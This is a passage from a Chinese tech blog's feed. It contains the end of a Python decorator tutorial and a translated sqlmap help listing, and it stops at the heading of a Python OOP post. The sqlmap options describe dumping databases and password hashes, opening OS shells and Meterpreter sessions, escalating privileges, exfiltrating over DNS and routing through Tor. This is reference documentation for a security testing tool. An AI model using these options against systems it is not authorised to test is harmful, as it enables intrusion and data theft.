</li><li>在inner函数的定义部分也加上一个参数，调用func函数的时候传递这个参数：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params">func</span>):<span class="hljs-comment">#2.func == f1</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params">n</span>): <span class="hljs-comment">#3.n == name,n就是被装饰函数的参数</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;新功能！&#x27;</span>)<br>        func(n) <span class="hljs-comment">#4.func(n) == f1(n)</span><br>    <span class="hljs-keyword">return</span> inner <span class="hljs-comment">#5.inner就会覆盖原先的被装饰函数名f1</span><br><br><span class="hljs-meta">@outer </span><span class="hljs-comment">#1.调用装饰器函数，将被装饰的函数名f1作为实参，传递给outer的形参</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>(<span class="hljs-params">name</span>): <span class="hljs-comment">#6.f1 == inner</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;f1的原有功能，f1的参数值为：&#x27;</span>,name)<br><br>f1(<span class="hljs-string">&#x27;bobo&#x27;</span>) <span class="hljs-comment">#7.inner(&#x27;bobo&#x27;)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>异常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工具说明书01</title>
    <link href="/2020/10/17/%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E%E4%B9%A601/"/>
    <url>/2020/10/17/%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E%E4%B9%A601/</url>
    
    <content type="html"><![CDATA[<h4 id="SQLMap使用说明"><a href="#SQLMap使用说明" class="headerlink" title="SQLMap使用说明"></a>SQLMap使用说明</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">用法：python sqlmap.py [选项]<br><br>选项：<br>  -h, <span class="hljs-comment">--help            显示基本帮助信息并退出</span><br>  -hh                   显示高级帮助信息并退出<br>  <span class="hljs-comment">--version             显示程序版本信息并退出</span><br>  -v <span class="hljs-keyword">VERBOSE</span>            输出信息详细程度级别：<span class="hljs-number">0</span><span class="hljs-number">-6</span>（默认为 <span class="hljs-number">1</span>）<br><br>  目标：<br>    至少提供一个以下选项以指定目标<br><br>    -u URL, <span class="hljs-comment">--url=URL   目标 URL（例如：&quot;http://www.site.com/vuln.php?id=1&quot;）</span><br>    -d DIRECT           可直接连接数据库的地址字符串<br>    -l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址<br>    -m BULKFILE         从文本文件中获取批量目标<br>    -r REQUESTFILE      从文件中读取 HTTP 请求<br>    -g GOOGLEDORK       使用 Google dork 结果作为目标<br>    -c CONFIGFILE       从 INI 配置文件中加载选项<br><br>  请求：<br>    以下选项可以指定连接目标地址的方式<br><br>    -A AGENT, <span class="hljs-comment">--user..  设置 HTTP User-Agent 头部值</span><br>    -H <span class="hljs-keyword">HEADER</span>, <span class="hljs-comment">--hea..  设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span><br>    <span class="hljs-comment">--method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span><br>    <span class="hljs-comment">--data=DATA         使用 POST 发送数据串（例如：&quot;id=1&quot;）</span><br>    <span class="hljs-comment">--param-del=PARA..  设置参数值分隔符（例如：&amp;）</span><br>    <span class="hljs-comment">--cookie=COOKIE     指定 HTTP Cookie（例如：&quot;PHPSESSID=a8d127e..&quot;）</span><br>    <span class="hljs-comment">--cookie-del=COO..  设置 cookie 分隔符（例如：;）</span><br>    <span class="hljs-comment">--live-cookies=L..  指定 Live cookies 文件以便加载最新的 Cookies 值</span><br>    <span class="hljs-comment">--load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span><br>    <span class="hljs-comment">--drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数</span><br>    <span class="hljs-comment">--mobile            使用 HTTP User-Agent 模仿智能手机</span><br>    <span class="hljs-comment">--random-agent      使用随机的 HTTP User-Agent</span><br>    <span class="hljs-comment">--host=HOST         指定 HTTP Host</span><br>    <span class="hljs-comment">--referer=REFERER   指定 HTTP Referer</span><br>    <span class="hljs-comment">--headers=HEADERS   设置额外的 HTTP 头参数（例如：&quot;Accept-Language: fr\nETag: 123&quot;）</span><br>    <span class="hljs-comment">--auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span><br>    <span class="hljs-comment">--auth-cred=AUTH..  HTTP 认证凭证（username:password）</span><br>    <span class="hljs-comment">--auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span><br>    <span class="hljs-comment">--ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：401）</span><br>    <span class="hljs-comment">--ignore-proxy      忽略系统默认代理设置</span><br>    <span class="hljs-comment">--ignore-redirects  忽略重定向尝试</span><br>    <span class="hljs-comment">--ignore-timeouts   忽略连接超时</span><br>    <span class="hljs-comment">--proxy=PROXY       使用代理连接目标 URL</span><br>    <span class="hljs-comment">--proxy-cred=PRO..  使用代理进行认证（username:password）</span><br>    <span class="hljs-comment">--proxy-file=PRO..  从文件中加载代理列表</span><br>    <span class="hljs-comment">--proxy-freq=PRO..  通过给定列表中的不同代理依次发出请求</span><br>    <span class="hljs-comment">--tor               使用 Tor 匿名网络</span><br>    <span class="hljs-comment">--tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span><br>    <span class="hljs-comment">--tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span><br>    <span class="hljs-comment">--check-tor         检查是否正确使用了 Tor</span><br>    <span class="hljs-comment">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br>    <span class="hljs-comment">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br>    <span class="hljs-comment">--retries=RETRIES   连接超时时重试次数（默认为 3）</span><br>    <span class="hljs-comment">--randomize=RPARAM  随机更改给定的参数值</span><br>    <span class="hljs-comment">--safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span><br>                        有些网站在你连续多次访问错误地址时会关闭会话连接，<br>                        后面的“请求”小节有详细说明）<br>    <span class="hljs-comment">--safe-post=SAFE..  使用 POST 方法发送合法的数据</span><br>    <span class="hljs-comment">--safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span><br>    <span class="hljs-comment">--safe-freq=SAFE..  在访问给定的合法 URL 之间穿插发送测试请求</span><br>    <span class="hljs-comment">--skip-urlencode    不对 payload 数据进行 URL 编码</span><br>    <span class="hljs-comment">--csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span><br>    <span class="hljs-comment">--csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL</span><br>    <span class="hljs-comment">--csrf-method=CS..  指定访问防 CSRF token 页面时使用的 HTTP 方法</span><br>    <span class="hljs-comment">--csrf-retries=C..  指定获取防 CSRF token 的重试次数 （默认为 0）</span><br>    <span class="hljs-comment">--force-ssl         强制使用 SSL/HTTPS</span><br>    <span class="hljs-comment">--chunked           使用 HTTP 分块传输编码（POST）请求</span><br>    <span class="hljs-comment">--hpp               使用 HTTP 参数污染攻击</span><br>    <span class="hljs-comment">--eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span><br>                        &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）<br><br>  优化：<br>    以下选项用于优化 sqlmap 性能<br><br>    -o                  开启所有优化开关<br>    <span class="hljs-comment">--predict-output    预测常用请求的输出</span><br>    <span class="hljs-comment">--keep-alive        使用持久的 HTTP(S) 连接</span><br>    <span class="hljs-comment">--null-connection   仅获取页面大小而非实际的 HTTP 响应</span><br>    <span class="hljs-comment">--threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）</span><br><br>  注入：<br>    以下选项用于指定要测试的参数，<br>    提供自定义注入 payloads 和篡改参数的脚本<br><br>    -p TESTPARAMETER    指定需要测试的参数<br>    <span class="hljs-comment">--skip=SKIP         指定要跳过的参数</span><br>    <span class="hljs-comment">--skip-static       指定跳过非动态参数</span><br>    <span class="hljs-comment">--param-exclude=..  用正则表达式排除参数（例如：&quot;ses&quot;）</span><br>    <span class="hljs-comment">--param-filter=P..  通过位置过滤可测试参数（例如：&quot;POST&quot;）</span><br>    <span class="hljs-comment">--dbms=DBMS         指定后端 DBMS（Database Management System，</span><br>                        数据库管理系统）类型（例如：MySQL）<br>    <span class="hljs-comment">--dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span><br>    <span class="hljs-comment">--os=OS             指定后端 DBMS 的操作系统类型</span><br>    <span class="hljs-comment">--invalid-bignum    将无效值设置为大数</span><br>    <span class="hljs-comment">--invalid-logical   对无效值使用逻辑运算</span><br>    <span class="hljs-comment">--invalid-string    对无效值使用随机字符串</span><br>    <span class="hljs-comment">--no-cast           关闭 payload 构造机制</span><br>    <span class="hljs-comment">--no-escape         关闭字符串转义机制</span><br>    <span class="hljs-comment">--prefix=PREFIX     注入 payload 的前缀字符串</span><br>    <span class="hljs-comment">--suffix=SUFFIX     注入 payload 的后缀字符串</span><br>    <span class="hljs-comment">--tamper=TAMPER     用给定脚本修改注入数据</span><br><br>  检测：<br>    以下选项用于自定义检测方式<br><br>    <span class="hljs-comment">--level=LEVEL       设置测试等级（1-5，默认为 1）</span><br>    <span class="hljs-comment">--risk=RISK         设置测试风险等级（1-3，默认为 1）</span><br>    <span class="hljs-comment">--string=STRING     用于确定查询结果为真时的字符串</span><br>    <span class="hljs-comment">--not-string=NOT..  用于确定查询结果为假时的字符串</span><br>    <span class="hljs-comment">--regexp=REGEXP     用于确定查询结果为真时的正则表达式</span><br>    <span class="hljs-comment">--code=CODE         用于确定查询结果为真时的 HTTP 状态码</span><br>    <span class="hljs-comment">--smart             只在使用启发式检测时才进行彻底的测试</span><br>    <span class="hljs-comment">--text-only         只根据页面文本内容对比页面</span><br>    <span class="hljs-comment">--titles            只根据页面标题对比页面</span><br><br>  技术：<br>    以下选项用于调整特定 <span class="hljs-keyword">SQL</span> 注入技术的测试方法<br><br>    <span class="hljs-comment">--technique=TECH..  使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span><br>                        B: <span class="hljs-type">Boolean</span>-based blind <span class="hljs-keyword">SQL</span> injection（布尔型盲注）<br>                        E: Error-based <span class="hljs-keyword">SQL</span> injection（报错型注入）<br>                        U: <span class="hljs-keyword">UNION</span> query <span class="hljs-keyword">SQL</span> injection（联合查询注入）<br>                        S: <span class="hljs-keyword">Stacked</span> queries <span class="hljs-keyword">SQL</span> injection（堆叠查询注入）<br>                        T: <span class="hljs-type">Time</span>-based blind <span class="hljs-keyword">SQL</span> injection（时间型盲注）<br>                        Q: <span class="hljs-keyword">inline</span> Query injection（内联查询注入）<br>    <span class="hljs-comment">--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br>    <span class="hljs-comment">--union-cols=UCOLS  设置联合查询注入测试的列数目范围</span><br>    <span class="hljs-comment">--union-char=UCHAR  用于暴力猜解列数的字符</span><br>    <span class="hljs-comment">--union-from=UFROM  设置联合查询注入 FROM 处用到的表</span><br>    <span class="hljs-comment">--dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span><br>                        推荐阅读《在<span class="hljs-keyword">SQL</span>注入中使用DNS获取数据》<br>                        http://cb.drops.wiki/drops/tips<span class="hljs-number">-5283.</span>html，<br>                        在后面的“技术”小节中也有相应解释）<br>    <span class="hljs-comment">--second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：</span><br>                        该选项用于 <span class="hljs-keyword">SQL</span> 二阶注入）<br>    <span class="hljs-comment">--second-req=SEC..  从文件读取 HTTP 二阶请求</span><br><br>  指纹识别：<br>    -f, <span class="hljs-comment">--fingerprint   执行广泛的 DBMS 版本指纹识别</span><br><br>  枚举：<br>    以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据<br><br>    -a, <span class="hljs-comment">--all           获取所有信息、数据</span><br>    -b, <span class="hljs-comment">--banner        获取 DBMS banner</span><br>    <span class="hljs-comment">--current-user      获取 DBMS 当前用户</span><br>    <span class="hljs-comment">--current-db        获取 DBMS 当前数据库</span><br>    <span class="hljs-comment">--hostname          获取 DBMS 服务器的主机名</span><br>    <span class="hljs-comment">--is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br>    <span class="hljs-comment">--users             枚举出 DBMS 所有用户</span><br>    <span class="hljs-comment">--passwords         枚举出 DBMS 所有用户的密码哈希</span><br>    <span class="hljs-comment">--privileges        枚举出 DBMS 所有用户特权级</span><br>    <span class="hljs-comment">--roles             枚举出 DBMS 所有用户角色</span><br>    <span class="hljs-comment">--dbs               枚举出 DBMS 所有数据库</span><br>    <span class="hljs-comment">--tables            枚举出 DBMS 数据库中的所有表</span><br>    <span class="hljs-comment">--columns           枚举出 DBMS 表中的所有列</span><br>    <span class="hljs-comment">--schema            枚举出 DBMS 所有模式</span><br>    <span class="hljs-comment">--count             获取数据表数目</span><br>    <span class="hljs-comment">--dump              导出 DBMS 数据库表项</span><br>    <span class="hljs-comment">--dump-all          导出所有 DBMS 数据库表项</span><br>    <span class="hljs-comment">--search            搜索列，表和/或数据库名</span><br>    <span class="hljs-comment">--comments          枚举数据时检查 DBMS 注释</span><br>    <span class="hljs-comment">--statements        获取 DBMS 正在执行的 SQL 语句</span><br>    -D DB               指定要枚举的 DBMS 数据库<br>    -T TBL              指定要枚举的 DBMS 数据表<br>    -C COL              指定要枚举的 DBMS 数据列<br>    -X <span class="hljs-keyword">EXCLUDE</span>          指定不枚举的 DBMS 标识符<br>    -U <span class="hljs-keyword">USER</span>             指定枚举的 DBMS 用户<br>    <span class="hljs-comment">--exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span><br>    <span class="hljs-comment">--pivot-column=P..  指定主列</span><br>    <span class="hljs-comment">--where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span><br>    <span class="hljs-comment">--start=LIMITSTART  指定要导出的数据表条目开始行数</span><br>    <span class="hljs-comment">--stop=LIMITSTOP    指定要导出的数据表条目结束行数</span><br>    <span class="hljs-comment">--first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span><br>    <span class="hljs-comment">--last=LASTCHAR     指定获取返回查询结果的结束字符位</span><br>    <span class="hljs-comment">--sql-query=SQLQ..  指定要执行的 SQL 语句</span><br>    <span class="hljs-comment">--sql-shell         调出交互式 SQL shell</span><br>    <span class="hljs-comment">--sql-file=SQLFILE  执行文件中的 SQL 语句</span><br><br>  暴力破解：<br>    以下选项用于暴力破解测试<br><br>    <span class="hljs-comment">--common-tables     检测常见的表名是否存在</span><br>    <span class="hljs-comment">--common-columns    检测常用的列名是否存在</span><br>    <span class="hljs-comment">--common-files      检测普通文件是否存在</span><br><br>  用户自定义函数注入：<br>    以下选项用于创建用户自定义函数<br><br>    <span class="hljs-comment">--udf-inject        注入用户自定义函数</span><br>    <span class="hljs-comment">--shared-lib=SHLIB  共享库的本地路径</span><br><br>  访问文件系统：<br>    以下选项用于访问后端 DBMS 的底层文件系统<br><br>    <span class="hljs-comment">--file-read=FILE..  读取后端 DBMS 文件系统中的文件</span><br>    <span class="hljs-comment">--file-write=FIL..  写入到后端 DBMS 文件系统中的文件</span><br>    <span class="hljs-comment">--file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件</span><br><br>  访问操作系统：<br>    以下选项用于访问后端 DBMS 的底层操作系统<br><br>    <span class="hljs-comment">--os-cmd=OSCMD      执行操作系统命令</span><br>    <span class="hljs-comment">--os-shell          调出交互式操作系统 shell</span><br>    <span class="hljs-comment">--os-pwn            调出 OOB shell，Meterpreter 或 VNC</span><br>    <span class="hljs-comment">--os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span><br>    <span class="hljs-comment">--os-bof            利用存储过程的缓冲区溢出</span><br>    <span class="hljs-comment">--priv-esc          数据库进程用户提权</span><br>    <span class="hljs-comment">--msf-path=MSFPATH  Metasploit 框架的本地安装路径</span><br>    <span class="hljs-comment">--tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br><br>  访问 Windows 注册表：<br>    以下选项用于访问后端 DBMS 的 Windows 注册表<br><br>    <span class="hljs-comment">--reg-read          读取一个 Windows 注册表键值</span><br>    <span class="hljs-comment">--reg-add           写入一个 Windows 注册表键值数据</span><br>    <span class="hljs-comment">--reg-del           删除一个 Windows 注册表键值</span><br>    <span class="hljs-comment">--reg-key=REGKEY    指定 Windows 注册表键</span><br>    <span class="hljs-comment">--reg-value=REGVAL  指定 Windows 注册表键值</span><br>    <span class="hljs-comment">--reg-data=REGDATA  指定 Windows 注册表键值数据</span><br>    <span class="hljs-comment">--reg-type=REGTYPE  指定 Windows 注册表键值类型</span><br><br>  通用选项：<br>    以下选项用于设置通用的参数<br><br>    -s SESSIONFILE      从文件（.sqlite）中读入会话信息<br>    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件<br>    <span class="hljs-comment">--answers=ANSWERS   预设回答（例如：&quot;quit=N,follow=N&quot;）</span><br>    <span class="hljs-comment">--base64=BASE64P..  表明参数包含 Base64 编码的数据</span><br>    <span class="hljs-comment">--base64-safe       使用 URL 与文件名安全的 Base64 字母表（RFC 4648）</span><br>    <span class="hljs-comment">--batch             从不询问用户输入，使用默认配置</span><br>    <span class="hljs-comment">--binary-fields=..  具有二进制值的结果字段（例如：&quot;digest&quot;）</span><br>    <span class="hljs-comment">--check-internet    在访问目标之前检查是否正常连接互联网</span><br>    <span class="hljs-comment">--cleanup           清理 DBMS 中特定的 sqlmap UDF 与数据表</span><br>    <span class="hljs-comment">--crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span><br>    <span class="hljs-comment">--crawl-exclude=..  用正则表达式筛选爬取的页面（例如：&quot;logout&quot;）</span><br>    <span class="hljs-comment">--csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span><br>    <span class="hljs-comment">--charset=CHARSET   指定 SQL 盲注字符集（例如：&quot;0123456789abcdef&quot;）</span><br>    <span class="hljs-comment">--dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span><br>    <span class="hljs-comment">--encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span><br>    <span class="hljs-comment">--eta               显示每个结果输出的预计到达时间</span><br>    <span class="hljs-comment">--flush-session     清空当前目标的会话文件</span><br>    <span class="hljs-comment">--forms             解析并测试目标 URL 的表单</span><br>    <span class="hljs-comment">--fresh-queries     忽略存储在会话文件中的查询结果</span><br>    <span class="hljs-comment">--gpage=GOOGLEPAGE  指定所用 Google dork 结果的页码</span><br>    <span class="hljs-comment">--har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span><br>    <span class="hljs-comment">--hex               获取数据时使用 hex 转换</span><br>    <span class="hljs-comment">--output-dir=OUT..  自定义输出目录路径</span><br>    <span class="hljs-comment">--parse-errors      从响应中解析并显示 DBMS 错误信息</span><br>    <span class="hljs-comment">--preprocess=PRE..  使用给定脚本做前处理（请求）</span><br>    <span class="hljs-comment">--postprocess=PO..  使用给定脚本做后处理（响应）</span><br>    <span class="hljs-comment">--repair            重新导出具有未知字符的数据（?）</span><br>    <span class="hljs-comment">--save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span><br>    <span class="hljs-comment">--scope=SCOPE       用正则表达式过滤目标</span><br>    <span class="hljs-comment">--skip-heuristics   不对 SQLi/XSS 漏洞进行启发式检测</span><br>    <span class="hljs-comment">--skip-waf          不对 WAF/IPS 进行启发式检测</span><br>    <span class="hljs-comment">--table-prefix=T..  指定临时数据表名前（默认：&quot;sqlmap&quot;）</span><br>    <span class="hljs-comment">--test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span><br>    <span class="hljs-comment">--test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span><br>    <span class="hljs-comment">--web-root=WEBROOT  指定 Web 服务器根目录（例如：&quot;/var/www&quot;）</span><br>    <br><br>  杂项：<br>    以下选项不属于前文的任何类别<br><br>    -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）<br>    <span class="hljs-comment">--alert=ALERT       在找到 SQL 注入时运行 OS 命令</span><br>    <span class="hljs-comment">--beep              在问题提示或在发现 SQL 注入/XSS/FI 时发出提示音</span><br>    <span class="hljs-comment">--dependencies      检查 sqlmap 缺少（可选）的依赖</span><br>    <span class="hljs-comment">--disable-coloring  关闭彩色控制台输出</span><br>    <span class="hljs-comment">--offline           在离线模式下工作（仅使用会话数据）</span><br>    <span class="hljs-comment">--purge             安全删除 sqlmap data 目录所有内容</span><br>    <span class="hljs-comment">--results-file=R..  指定多目标模式下的 CSV 结果输出路径</span><br>    <span class="hljs-comment">--shell             调出交互式 sqlmap shell</span><br>    <span class="hljs-comment">--tmp-dir=TMPDIR    指定用于存储临时文件的本地目录</span><br>    <span class="hljs-comment">--unstable          为不稳定连接调整选项</span><br>    <span class="hljs-comment">--update            更新 sqlmap</span><br>    <span class="hljs-comment">--wizard            适合初级用户的向导界面</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQLMap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python---面向对象</title>
    <link href="/2020/10/15/python---%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    <url>/2020/10/15/python---%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    
